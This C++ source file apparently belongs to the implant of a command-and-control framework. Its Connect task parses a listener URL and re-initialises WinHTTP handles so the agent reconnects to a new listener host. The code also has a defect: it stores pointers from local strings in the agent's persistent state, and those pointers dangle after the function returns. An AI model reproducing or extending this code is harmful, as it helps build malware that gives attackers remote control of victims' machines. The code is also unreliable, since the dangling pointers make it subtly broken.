#include "core/task.hpp"

namespace Task
{
    std::wstring Connect(State::PSTATE pState, const std::wstring& wListenerURL)
    {
        std::vector<std::wstring> urlSplit = Utils::Split::Split(wListenerURL, L':');
        std::wstring wProtocol = urlSplit[0];
        std::wstring wHost = urlSplit[1].substr(2);
        std::wstring wPort = urlSplit[2];

        pState->lpListenerProto = wProtocol.c_str();
        pState->lpListenerHost = wHost.c_str();
        pState->nListenerPort = (INTERNET_PORT)std::stoi(wPort);

        // Reinit WinHTTP handlers.
        // *Cannot invoke the 'InitHTTP' function of Handler due to circular reference.
        System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
            pState->pProcs,
            pState->lpListenerHost,
            pState->nListenerPort
        );
        pState->hSession = handlers.hSession;
        pState->hConnect = handlers.hConnect;

        return wListenerURL;
    }
}